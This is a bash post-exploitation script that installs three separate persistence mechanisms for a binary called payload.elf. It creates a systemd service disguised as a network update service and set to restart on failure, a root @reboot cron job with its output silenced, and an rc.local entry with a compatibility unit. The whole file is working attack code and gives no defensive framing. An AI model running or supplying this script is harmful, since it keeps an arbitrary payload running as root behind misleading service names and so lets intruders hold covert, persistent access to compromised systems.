#!/bin/bash
set -e

PAYLOAD="/opt/payload/payload.elf"

# Ensure payload is executable
chmod +x "$PAYLOAD"

# ----------------------------
# 1. Systemd Service
# ----------------------------
SERVICE_NAME="systemd-networkd-update.service"

cat <<EOF >/etc/systemd/system/$SERVICE_NAME
[Unit]
Description=Systemd Network Update Service
After=network.target

[Service]
ExecStart=$PAYLOAD
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF

# Enable and start the service
systemctl daemon-reexec
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

# ----------------------------
# 2. Cron Job (@reboot)
# ----------------------------
CRON_FILE="/etc/cron.d/system-update-cron"

cat <<EOF > $CRON_FILE
@reboot root $PAYLOAD >/dev/null 2>&1
EOF

chmod 600 $CRON_FILE

# ----------------------------
# 3. rc.local Fallback
# ----------------------------
if [ ! -f /etc/rc.local ]; then
    echo "#!/bin/sh -e" > /etc/rc.local
    chmod +x /etc/rc.local
fi

# Add payload execution if not already present
grep -q "$PAYLOAD" /etc/rc.local || sed -i "\$i$PAYLOAD &\n" /etc/rc.local

# Ensure rc-local is executed at boot (for distros where it is disabled)
if [ -d /etc/systemd/system ]; then
    RC_SERVICE="/etc/systemd/system/rc-local.service"
    if [ ! -f "$RC_SERVICE" ]; then
        cat <<EOF > "$RC_SERVICE"
[Unit]
Description=/etc/rc.local Compatibility
ConditionPathExists=/etc/rc.local

[Service]
Type=forking
ExecStart=/etc/rc.local start
TimeoutSec=0
StandardOutput=tty
RemainAfterExit=yes
SysVStartPriority=99

[Install]
WantedBy=multi-user.target
EOF
        systemctl enable rc-local
        systemctl start rc-local || true
    fi
fi

echo "[*] Three-layer persistence installed for $PAYLOAD"
